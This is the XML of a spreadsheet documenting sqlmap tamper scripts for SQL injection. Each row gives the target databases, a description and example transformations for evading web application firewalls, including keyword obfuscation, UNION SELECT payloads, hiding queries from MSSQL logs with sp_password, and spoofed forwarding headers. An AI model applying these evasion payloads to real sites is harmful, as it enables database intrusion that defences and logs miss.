            <text:p>Adds a percentage sign ('%') infront of each character. Useful to bypass weak and bespoke web application firewalls</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; tamper('SELECT FIELD FROM TABLE')</text:p>
            <text:p><text:s text:c="4"/>'%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E'</text:p>
            <text:p><text:s text:c="4"/>"""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percentage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Adds a percentage sign ('%') infront of each character. Useful to bypass weak and bespoke web application firewalls</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; tamper('SELECT FIELD FROM TABLE')</text:p>
            <text:p><text:s text:c="4"/>'%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E'</text:p>
            <text:p><text:s text:c="4"/>"""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plus2concat</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce4">
            <text:p>Microsoft SQL Server 2012</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce5">
            <text:p>Replaces plus ('+') character with function CONCAT(). Useful in case ('+') character is filtered.<text:s/></text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; tamper('SELECT CHAR(113)+CHAR(114)+CHAR(115) FROM DUAL')</text:p>
            <text:p><text:s text:c="4"/>'SELECT CONCAT(CHAR(113),CHAR(114),CHAR(115)) FROM DUAL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plus2concat</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce4">
            <text:p>Microsoft SQL Server 2012+</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce5">
            <text:p>Replaces plus ('+') character with function CONCAT(). Useful in case ('+') character is filtered.<text:s/></text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; tamper('SELECT CHAR(113)+CHAR(114)+CHAR(115) FROM DUAL')</text:p>
            <text:p><text:s text:c="4"/>'SELECT CONCAT(CHAR(113),CHAR(114),CHAR(115)) FROM DUAL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plus2fnconcat</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce4">
            <text:p>Microsoft SQL Server 2008</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce5">
            <text:p>Replaces plus ('+') character with ODBC function {fn CONCAT()}. Useful in case ('+') character is filtered https://msdn.microsoft.com/en-us/library/bb630290.aspx</text:p>
            <text:p/>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>tamper('SELECT CHAR(113)+CHAR(114)+CHAR(115) FROM DUAL')</text:p>
            <text:p><text:s text:c="4"/>'SELECT {fn CONCAT({fn CONCAT(CHAR(113),CHAR(114))},CHAR(115))} FROM DUAL'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plus2fnconcat</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce4">
            <text:p>Microsoft SQL Server 2008+</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce5">
            <text:p>Replaces plus ('+') character with ODBC function {fn CONCAT()}. Useful in case ('+') character is filtered https://msdn.microsoft.com/en-us/library/bb630290.aspx</text:p>
            <text:p/>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>tamper('SELECT CHAR(113)+CHAR(114)+CHAR(115) FROM DUAL')</text:p>
            <text:p><text:s text:c="4"/>'SELECT {fn CONCAT({fn CONCAT(CHAR(113),CHAR(114))},CHAR(115))} FROM DUAL'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MySQL 4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MySQL 5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6">
          <table:table-cell office:value-type="string" table:style-name="ce4">
            <text:p>randomcase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Replaces each keyword character with random case value. Useful to bypass very weak and bespoke web application firewalls that has poorly written permissive regular expressions.<text:s/><text:span text:style-name="T2">This tamper script should work against all (?) databases</text:span><text:span text:style-name="T2"/></text:p>
            <text:p/>
            <text:p/>
            <text:p/>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; import random</text:p>
            <text:p><text:s text:c="4"/>&gt;&gt;&gt; random.seed(0)</text:p>
            <text:p><text:s text:c="4"/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randomcomments</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce4">
            <text:p>UNIVERSAL \ NOT DESCRIBED</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce8">
            <text:p>Add random comments to SQL keywords.<text:s/></text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce3">
            <text:p>&gt;&gt;&gt; import random</text:p>
            <text:p><text:s text:c="4"/>&gt;&gt;&gt; random.seed(0)</text:p>
            <text:p><text:s text:c="4"/>&gt;&gt;&gt; tamper('INSERT')</text:p>
            <text:p><text:s text:c="4"/>'I/**/N/**/SERT'</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="16380" table:style-name="ce7"/>
        </table:table-row>
        <table:table-row table:style-name="ro7">
          <table:table-cell office:value-type="string" table:style-name="ce4">
            <text:p>securesphere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Appends special crafted string.<text:s/><text:span text:style-name="T2">Useful for bypassing Imperva SecureSphere WAF</text:span>. Reference: http://seclists.org/fulldisclosure/2011/May/163</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; tamper('1 AND 1=1')</text:p>
            <text:p><text:s text:c="4"/>"1 AND 1=1 and '0having'='0having'"</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="16380"/>
        </table:table-row>
        <table:table-row table:style-name="ro8">
          <table:table-cell office:value-type="string" table:style-name="ce4">
            <text:p>sp_password</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce4">
            <text:p>MSSQL</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce5">
            <text:p>Appends 'sp_password' to the end of the payload for automatic obfuscation from DBMS logs. Appending sp_password to the end of the query will hide it from T-SQL logs as a security measure Reference: http://websec.ca/kb/sql_injection</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; tamper('1 AND 9227=9227-- ')</text:p>
            <text:p><text:s text:c="4"/>'1 AND 9227=9227-- sp_password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MySQL 4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MySQL 5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Oracle 10g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comment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Replaces space character (' ') with comments '/**/' Useful to bypass weak and bespoke web application firewalls</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; tamper('SELECT id FROM users')</text:p>
            <text:p><text:s text:c="4"/>'SELECT/**/id/**/FROM/**/users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space2dash</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce4">
            <text:p>MSSQL</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce5">
            <text:p>Replaces space character (' ') with a dash comment ('--') followed by a random string and a new line ('\n'). Useful to bypass several web application firewalls Used during the ZeroNights SQL injection challenge https://proton.onsec.ru/contest/</text:p>
            <text:p/>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; random.seed(0)</text:p>
            <text:p><text:s text:c="4"/>&gt;&gt;&gt; tamper('1 AND 9227=9227')</text:p>
            <text:p><text:s text:c="4"/>'1--nVNaVoPYeva%0AAND--ngNvzqu%0A9227=9227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space2dash</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce4">
            <text:p>SQLite</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce5">
            <text:p>Replaces space character (' ') with a dash comment ('--') followed by a random string and a new line ('\n').<text:s/><text:span text:style-name="T2">Useful to bypass several web application firewalls</text:span><text:s/>Used during the ZeroNights SQL injection challenge https://proton.onsec.ru/contest/</text:p>
            <text:p/>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; random.seed(0)</text:p>
            <text:p><text:s text:c="4"/>&gt;&gt;&gt; tamper('1 AND 9227=9227')</text:p>
            <text:p><text:s text:c="4"/>'1--nVNaVoPYeva%0AAND--ngNvzqu%0A9227=9227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hash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Replaces space character (' ') with a pound character ('#') followed by a random string and a new line ('\n').<text:s/><text:span text:style-name="T2">Useful to bypass several web application firewalls</text:span>. Used during the ModSecurity SQL injection challenge http://modsecurity.org/demo/challenge.html</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; random.seed(0)</text:p>
            <text:p><text:s text:c="4"/>&gt;&gt;&gt; tamper('1 AND 9227=9227')</text:p>
            <text:p><text:s text:c="4"/>'1%23nVNaVoPYeva%0AAND%23ngNvzqu%0A9227=9227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hash</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce3">
            <text:p>MySQL 4.0</text:p>
            <text:p/>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce5">
            <text:p>Replaces space character (' ') with a pound character ('#') followed by a random string and a new line ('\n').<text:s/><text:span text:style-name="T2">Useful to bypass several web application firewalls</text:span>. Used during the ModSecurity SQL injection challenge http://modsecurity.org/demo/challenge.html</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; random.seed(0)</text:p>
            <text:p><text:s text:c="4"/>&gt;&gt;&gt; tamper('1 AND 9227=9227')</text:p>
            <text:p><text:s text:c="4"/>'1%23nVNaVoPYeva%0AAND%23ngNvzqu%0A9227=9227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hash</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce3">
            <text:p>MySQL 5.0</text:p>
            <text:p/>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce5">
            <text:p>Replaces space character (' ') with a pound character ('#') followed by a random string and a new line ('\n').<text:s/><text:span text:style-name="T2">Useful to bypass several web application firewalls</text:span>. Used during the ModSecurity SQL injection challenge http://modsecurity.org/demo/challenge.html</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; random.seed(0)</text:p>
            <text:p><text:s text:c="4"/>&gt;&gt;&gt; tamper('1 AND 9227=9227')</text:p>
            <text:p><text:s text:c="4"/>'1%23nVNaVoPYeva%0AAND%23ngNvzqu%0A9227=9227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morecomment</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce4">
            <text:p>MySQL 5.0</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce5">
            <text:p>Replaces space character (' ') with comments '/**_**/'<text:s/><text:span text:style-name="T2">Useful to bypass weak and bespoke web application firewalls</text:span><text:span text:style-name="T2"/></text:p>
            <text:p/>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; tamper('SELECT id FROM users')</text:p>
            <text:p><text:s text:c="4"/>'SELECT/**_**/id/**_**/FROM/**_**/users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morecomment</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce4">
            <text:p>MySQL 5.5</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce5">
            <text:p>Replaces space character (' ') with comments '/**_**/'<text:s/><text:span text:style-name="T2">Useful to bypass weak and bespoke web application firewalls</text:span><text:span text:style-name="T2"/></text:p>
            <text:p/>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; tamper('SELECT id FROM users')</text:p>
            <text:p><text:s text:c="4"/>'SELECT/**_**/id/**_**/FROM/**_**/users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space2morehash</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce4">
            <text:p>MySQL &gt;= 5.1.13</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce5">
            <text:p>Replaces space character (' ') with a pound character ('#') followed by a random string and a new line ('\n')</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce9"/>
          <table:table-cell table:number-columns-repeated="16380"/>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" table:style-name="ce4">
            <text:p>space2morehash</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce4">
            <text:p>MySQL 5.1.41</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce5">
            <text:p>Useful to bypass several web application firewalls. Used during the ModSecurity SQL injection challenge http://modsecurity.org/demo/challenge.html</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; random.seed(0)</text:p>
            <text:p><text:s text:c="4"/>&gt;&gt;&gt; tamper('1 AND 9227=9227')</text:p>
            <text:p><text:s text:c="4"/>'1%23ngNvzqu%0AAND%23nVNaVoPYeva%0A%23lujYFWfv%0A9227=9227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3">
            <text:p>space2mssqlblank</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce4">
            <text:p>Microsoft SQL Server</text:p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Eid%0DFROM%07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3">
            <text:p>space2mssqlblank</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce4">
            <text:p>Microsoft SQL Server 2000</text:p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Eid%0DFROM%07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3">
            <text:p>space2mssqlblank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Eid%0DFROM%07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mssqlhash</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce4">
            <text:p>MSSQL</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce5">
            <text:p>Replaces space character (' ') with a pound character ('#') followed by a new line ('\n').<text:s/><text:span text:style-name="T2">Useful to bypass several web application firewalls</text:span></text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; tamper('1 AND 9227=9227')</text:p>
            <text:p><text:s text:c="4"/>'1%23%0AAND%23%0A9227=9227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mssqlhash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Replaces space character (' ') with a pound character ('#') followed by a new line ('\n').<text:s/><text:span text:style-name="T2">Useful to bypass several web application firewalls</text:span></text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; tamper('1 AND 9227=9227')</text:p>
            <text:p><text:s text:c="4"/>'1%23%0AAND%23%0A9227=9227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mysqlblank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A0id%0BFROM%0C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mysqlblank</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce4">
            <text:p>MySQL 5.1</text:p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A0id%0BFROM%0Cusers'</text:p>
            <text:p/>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="16380"/>
        </table:table-row>
        <table:table-row table:style-name="ro7">
          <table:table-cell office:value-type="string" table:style-name="ce4">
            <text:p>space2mysqldash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Replaces space character (' ') with a dash comment ('--') followed by a new line ('\n').<text:span text:style-name="T2"><text:s/>Useful to bypass several web application firewalls.</text:span></text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>tamper('1 AND 9227=9227')</text:p>
            <text:p><text:s text:c="4"/>'1--%0AAND--%0A9227=9227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space2mysqldash</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce4">
            <text:p>MSSQL</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce5">
            <text:p>Replaces space character (' ') with a dash comment ('--') followed by a new line ('\n').<text:span text:style-name="T2"><text:s/>Useful to bypass several web application firewalls.</text:span></text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>tamper('1 AND 9227=9227')</text:p>
            <text:p><text:s text:c="4"/>'1--%0AAND--%0A9227=9227'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pace2plus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space character (' ') with plus ('+'). Is this any useful? The plus get's url-encoded by sqlmap engine invalidating the query afterwards.<text:s/><text:span text:style-name="T2">This tamper script works against all databases</text:span></text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; tamper('SELECT id FROM users')</text:p>
            <text:p><text:s text:c="4"/>'SELECT+id+FROM+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randomblank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Did%0DFROM%0A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randomblank</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce3">
            <text:p>MySQL 4.0</text:p>
            <text:p/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Did%0DFROM%0A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randomblank</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce3">
            <text:p>MySQL 5.0</text:p>
            <text:p/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Did%0DFROM%0Ausers'</text:p>
            <text:p/>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="16380"/>
        </table:table-row>
        <table:table-row table:style-name="ro8">
          <table:table-cell office:value-type="string" table:style-name="ce4">
            <text:p>space2randomblank</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce3">
            <text:p>MySQL 5.5</text:p>
            <text:p/>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce5">
            <text:p>Replaces space character (' ') with a random blank character from a valid set of alternate characters.<text:s/><text:span text:style-name="T2">Useful to bypass several web application firewalls</text:span><text:span text:style-name="T2"/></text:p>
            <text:p/>
            <text:p/>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; random.seed(0)</text:p>
            <text:p><text:s text:c="4"/>&gt;&gt;&gt; tamper('SELECT id FROM users')</text:p>
            <text:p><text:s text:c="4"/>'SELECT%0Did%0DFROM%0Ausers'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symboliclogical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AND and OR logical operators with their symbolic counterparts (&amp;&amp; and ||)</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; tamper("1 AND '1'='1")</text:p>
            <text:p><text:s text:c="4"/>"1 %26%26 '1'='1"</text:p>
            <text:p/>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="16380"/>
        </table:table-row>
        <table:table-row table:style-name="ro3">
          <table:table-cell office:value-type="string" table:style-name="ce4">
            <text:p>unionalltounion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UNION ALL SELECT with UNION SELECT</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; tamper('-1 UNION ALL SELECT')</text:p>
            <text:p><text:s text:c="4"/>'-1 UNION SELECT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unmagicquotes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Replaces quote character (') with a multi-byte combo %bf%27 together with generic comment at the end (to make it work).<text:s/><text:span text:style-name="T2">Useful for bypassing magic_quotes/addslashes feature h</text:span>ttp://shiflett.org/blog/2006/jan/addslashes-versus-mysql-real-escape-string</text:p>
            <text:p/>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; tamper("1' AND 1=1")</text:p>
            <text:p><text:s text:c="4"/>'1%bf%27-- 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3">
            <text:p>Microsoft SQL Server 2005</text:p>
            <text:p/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3">
            <text:p>MySQL 4.0</text:p>
            <text:p/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3">
            <text:p>MySQL 5.0</text:p>
            <text:p/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3">
            <text:p>MySQL 5.5</text:p>
            <text:p/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4">
            <text:p>PostgreSQL 8.3</text:p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4">
            <text:p>PostgreSQL 8.4</text:p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5">
          <table:table-cell office:value-type="string" table:style-name="ce4">
            <text:p>uppercase</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce4">
            <text:p>PostgreSQL 9.0</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce5">
            <text:p>Replaces each keyword character with upper case value. Useful to bypass very weak and bespoke web application firewalls that has poorly written permissive regular expressions.<text:span text:style-name="T2"><text:s/>This tamper script should work against all (?) databases</text:span><text:span text:style-name="T2"/></text:p>
            <text:p/>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; tamper('insert')</text:p>
            <text:p><text:s text:c="4"/>'INSERT'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varnish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Append a HTTP header 'X-originating-IP' to bypass WAF Protection of Varnish Firewall Reference: http://h30499.www3.hp.com/t5/Fortify-Application-Security/Bypassing-web-application-firewalls-using-HTTP-headers/ba-p/6418366</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt; X-forwarded-for: TARGET_CACHESERVER_IP (184.189.250.X)</text:p>
            <text:p><text:s text:c="8"/>&gt;&gt; X-remote-IP: TARGET_PROXY_IP (184.189.250.X)</text:p>
            <text:p><text:s text:c="8"/>&gt;&gt; X-originating-IP: TARGET_LOCAL_IP (127.0.0.1)</text:p>
            <text:p><text:s text:c="8"/>&gt;&gt; x-remote-addr: TARGET_INTERNALUSER_IP (192.168.1.X)</text:p>
            <text:p><text:s text:c="8"/>&gt;&gt; X-remote-IP: * or %00 or %0A</text:p>
            <text:p/>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="16380"/>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell office:value-type="string" table:style-name="ce4">
            <text:p>versionedkeywords</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce4">
            <text:p>MySQL</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce5">
            <text:p>Encloses each non-function keyword with versioned MySQL comment. Useful to bypass several web application firewalls when the back-end database management system is MySQL</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; tamper('1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#')</text:p>
            <text:p><text:s text:c="4"/>'1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/*!AS*//*!CHAR*/),CHAR(32)),CHAR(58,100,114,117,58))#'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versionedkeywords</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce4">
            <text:p>MySQL 4.0.18</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce5">
            <text:p>Encloses each non-function keyword with versioned MySQL comment. Useful to bypass several web application firewalls when the back-end database management system is MySQL</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; tamper('1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#')</text:p>
            <text:p><text:s text:c="4"/>'1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/*!AS*//*!CHAR*/),CHAR(32)),CHAR(58,100,114,117,58))#'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versionedkeywords</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce4">
            <text:p>MySQL 5.1.56</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce5">
            <text:p>Encloses each non-function keyword with versioned MySQL comment. Useful to bypass several web application firewalls when the back-end database management system is MySQL</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; tamper('1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#')</text:p>
            <text:p><text:s text:c="4"/>'1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/*!AS*//*!CHAR*/),CHAR(32)),CHAR(58,100,114,117,58))#'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versionedkeywords</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce4">
            <text:p>MySQL 5.5.11</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce5">
            <text:p>Encloses each non-function keyword with versioned MySQL comment. Useful to bypass several web application firewalls when the back-end database management system is MySQL</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; tamper('1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#')</text:p>
            <text:p><text:s text:c="4"/>'1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/*!AS*//*!CHAR*/),CHAR(32)),CHAR(58,100,114,117,58))#'</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="16380"/>
        </table:table-row>
        <table:table-row table:style-name="ro10">
          <table:table-cell office:value-type="string" table:style-name="ce4">
            <text:p>versionedmorekeywords</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce4">
            <text:p>MySQL &gt;= 5.1.13</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce5">
            <text:p>Encloses each keyword with versioned MySQL comment. Useful to bypass several web application firewalls when the back-end database management system is MySQL</text:p>
            <text:p/>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; tamper('1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))#')</text:p>
            <text:p><text:s text:c="4"/>'1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/,/*!CONCAT*/(/*!CHAR*/(58,122,114,115,58),/*!IFNULL*/(CAST(/*!CURRENT_USER*/()/*!AS*//*!CHAR*/),/*!CHAR*/(32)),/*!CHAR*/(58,115,114,121,58))#'</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="16380"/>
        </table:table-row>
        <table:table-row table:style-name="ro10">
          <table:table-cell office:value-type="string" table:style-name="ce4">
            <text:p>versionedmorekeywords</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce4">
            <text:p>MySQL 5.1.56</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce5">
            <text:p>Encloses each keyword with versioned MySQL comment. Useful to bypass several web application firewalls when the back-end database management system is MySQL</text:p>
            <text:p/>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; tamper('1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))#')</text:p>
            <text:p><text:s text:c="4"/>'1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/,/*!CONCAT*/(/*!CHAR*/(58,122,114,115,58),/*!IFNULL*/(CAST(/*!CURRENT_USER*/()/*!AS*//*!CHAR*/),/*!CHAR*/(32)),/*!CHAR*/(58,115,114,121,58))#'</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="16380"/>
        </table:table-row>
        <table:table-row table:style-name="ro10">
          <table:table-cell office:value-type="string" table:style-name="ce4">
            <text:p>versionedmorekeywords</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce4">
            <text:p>MySQL 5.5.11</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce5">
            <text:p>Encloses each keyword with versioned MySQL comment. Useful to bypass several web application firewalls when the back-end database management system is MySQL</text:p>
            <text:p/>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce6">
            <text:p>&gt;&gt;&gt; tamper('1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))#')</text:p>
            <text:p><text:s text:c="4"/>'1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/,/*!CONCAT*/(/*!CHAR*/(58,122,114,115,58),/*!IFNULL*/(CAST(/*!CURRENT_USER*/()/*!AS*//*!CHAR*/),/*!CHAR*/(32)),/*!CHAR*/(58,115,114,121,58))#'</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="16380"/>
        </table:table-row>
        <table:table-row table:style-name="ro7">
          <table:table-cell office:value-type="string" table:style-name="ce4">
            <text:p>xforwardedfor</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce4">
            <text:p>UNIVERSAL \ NOT DESCRIBED</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce5">
            <text:p>Append a fake HTTP header 'X-Forwarded-For' to bypass</text:p>
            <text:p><text:s text:c="4"/>WAF (usually application based) protection</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce9"/>
          <table:table-cell table:number-columns-repeated="16380"/>
        </table:table-row>
        <table:table-row table:number-rows-repeated="142" table:style-name="ro2">
          <table:table-cell table:number-columns-repeated="2" table:style-name="ce4"/>
          <table:table-cell table:style-name="ce5"/>
          <table:table-cell table:style-name="ce9"/>
          <table:table-cell table:number-columns-repeated="16380"/>
        </table:table-row>
        <table:table-row table:number-rows-repeated="1048280" table:style-name="ro2">
          <table:table-cell table:number-columns-repeated="16384"/>
        </table:table-row>
      </table:table>
      <table:database-ranges>
        <table:database-range table:target-range-address="Plan1.A2:Plan1.D296" table:name="Tabe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9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indows</meta:initial-creator>
    <dc:creator>MX</dc:creator>
    <meta:creation-date>2017-10-20T17:12:51Z</meta:creation-date>
    <dc:date>2017-10-21T03:23:01Z</dc:date>
  </office:meta>
</office:document-meta>
</file>